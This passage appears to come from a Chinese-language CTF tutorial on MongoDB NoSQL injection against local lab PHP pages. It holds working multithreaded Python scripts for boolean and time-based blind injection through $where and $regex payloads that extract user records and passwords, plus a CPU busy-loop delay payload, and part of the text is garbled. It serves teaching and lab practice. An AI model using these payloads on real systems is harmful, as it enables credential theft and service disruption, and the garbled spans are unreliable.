            # else:
            #     break
    if __name__ == "__main__":
        find_bind()
`==` 注入比较慢，本文采用多线程
    # -*- coding: utf-8 -*-    import threading
    import requests
    import random
    import base64
    user_agent = [
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
    ]
    # threading sql injection
    class SQL(threading.Thread):
        def __init__(self, func, args):
            threading.Thread.__init__(self)
            self.func = func
            self.args = args
        def getresult(self):
            return self.res
        def run(self):
            self.res = self.func(*self.args)
    # bind sql injection
    def bind_sql(a, i):
        lock = threading.Lock()
        lock.acquire()
        for mid in range(32, 128):
            o = a + i
            # payload = "'});if(db.version()" + f"[{o}]=='{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
            # payload = "'});if(tojson(db)" + f"[{o}]=='{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
            # payload = "'});if(tojson(db.getCollectionNames())" + f"[{o}]=='{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
            payload = "'});if(tojson(db.users.find()[0])" + f"[{o}]=='{chr(mid)}')" + "{return ({username:'admin',password:''})};var fuck = ({'test':'"
            # print(payload)
            headers = {'User-agent': user_agent[random.randint(0, 7)]}
            data = {
                'u': payload,
                'p': '1'
            }
            # print(data)
            res = requests.get(url=url, params=data, headers=headers)
            # print(res.text)
            if "welcome admin" in res.text:
                return mid
        # 跑快了容易429导致下面if执行而断片, 不必要时可注释
        # if mid == 127:
        #     return 0
        # lock.release()
    def main(thread):
        flag = ''
        # 从第一位开始
        a = 0
        f = True
        while f:
            threads = []
            for i in range(0, thread):
                t = SQL(bind_sql, (a, i))
                threads.append(t)
            for i in range(0, thread):
                threads[i].start()
            for i in range(0, thread):
                threads[i].join()
                ch = threads[i].getresult()
                # 以0结尾则停止注入
                if ch == 0:
                    f = False
                try:
                    flag = flag + chr(ch)
                except:
                    pass
            a = a + thread
            print(flag)
    if __name__ == '__main__':
        url = "http://localhost/CTF/test89/find3.php"
        # 一次输出几位
        thread = 5
        main(thread)
另一种盲注，也就是数组盲注
    test;
    $coll = $db->users;
    $username = $_GET['u'];
    $password = $_GET['p'];
    $data = array(
        'username'=>$username,
        'password'=>$password
    );
    xdebug_var_dump($data);
    $data = $coll->findOne($data);
    if($data['username'] != null){
        if($data['username'] == 'admin'){
                echo 'welcome admin';
            }else{
                echo 'welcome user, you are not admin!';
        }
    }
    else{
        echo 'Cannot find users :(';
    }
    ?>
通过数组正则读取信息
    ?u[$regex]=^a&p[$regex]=^flag.*$
然后写脚本爆破
    # -*-coding:utf-8-*-    import requests
    import string
    # input url
    url = "http://localhost/CTF/test89/find4.php"
    dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + ':{}-_!`'
    def find_bind():
        flag = ''
        for i in range(1000):
            for mid in dic:
                guess = flag + mid
                payload = "^" + guess + ".*$"
                data = {
                    'u[$regex]': '^a',
                    'p[$regex]': payload
                }
                # print(data)
                res = requests.get(url=url, params=data)
                # print(res.text)
                if "welcome admin" in res.text:
                    flag += mid
                    print(flag)
                    break
            # if mid == '`':
            #     break
    if __name__ == "__main__":
        find_bind()
**find 时间盲注**
高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注
    test;
    xdebug_var_dump($query);
    $data = $db->execute($query);
    if ($data['ok'] == 1) {
        if ($data['retval']!=NULL) {
            return true;
        }else{
            return false;
        }
    }else{
        echo $data['errmsg'];
    }
    ?>
通过是否查询的到信息来决定是否延时
    ?u='});if(db.version()[0]=='2'){return sleep(1000);};var fuck = ({'test':'&p=1
多线程还是容易乱，调到一线程就行
    # -*- coding: utf-8 -*-    import threading
    import requests
    import random
    import time
    user_agent = [
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
    ]
    # threading sql injection
    class SQL(threading.Thread):
        def __init__(self, func, args):
            threading.Thread.__init__(self)
            self.func = func
            self.args = args
        def getresult(self):
            return self.res
        def run(self):
            self.res = self.func(*self.args)
    # bind sql injection
    def bind_sql(a, i):
        lock = threading.Lock()
        lock.acquire()
        for mid in range(32, 128):
            o = a + i
            # payload = "'});if(db.version()" + f"[{o}]=='{chr(mid)}')" + "{return sleep(1000)};var fuck = ({'test':'"
            # payload = "'});if(tojson(db)" + f"[{o}]=='{chr(mid)}')" + "{return sleep(1000)};var fuck = ({'test':'"
            # payload = "'});if(tojson(db.getCollectionNames())" + f"[{o}]=='{chr(mid)}')" + "{return sleep(1000)};var fuck = ({'test':'"
            payload = "'});if(tojson(db.users.find()[0])" + f"[{o}]=='{chr(mid)}')" + "{return sleep(1000)};var fuck = ({'test':'"
            # print(payload)
            headers = {'User-agent': user_agent[random.randint(0, 7)]}
            data = {
                'u': payload,
                'p': '1'
            }
            before_time = time.time()
            # print(data)
            res = requests.get(url=url, params=data, headers=headers)
            after_time = time.time()
            offset = after_time - before_time
            # print(res.text)
            if offset > 1:
                return mid
        # 跑快了容易429导致下面if执行而断片, 不必要时可注释
        # if mid == 127:
        #     return 0
        lock.release()
    def main(thread):
        flag = ''
        # 从第一位开始
        a = 0
        f = True
        while f:
            threads = []
            for i in range(0, thread):
                t = SQL(bind_sql, (a, i))
                threads.append(t)
            for i in range(0, thread):
                threads[i].start()
            for i in range(0, thread):
                threads[i].join()
                ch = threads[i].getresult()
                # 以0结尾则停止注入
                if ch == 0:
                    f = False
                try:
                    flag = flag + chr(ch)
                except:
                    pass
            a = a + thread
            print(flag)
    if __name__ == '__main__':
        url = "http://localhost/CTF/test89/find5.php"
        # 一次输出几位
        thread = 1
        main(thread)
如果 sleep 无法使用的话，可以使用类似 DOS 攻击的延时操作
    ?u='});if(db.version()[0]=='2'){return (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date 1:
                    flag += chr(mid)
                    print(flag)
                    break
            # if mid == 127:
            #     break
    if __name__ == "__main__":
        find_bind()
然后另一种以数组方式注入就无法实现实现时间盲注
    > db.users.find({'username': {'$regex': '^a'}, 'password': {'$where': 'function(){sleep(1000);}'}})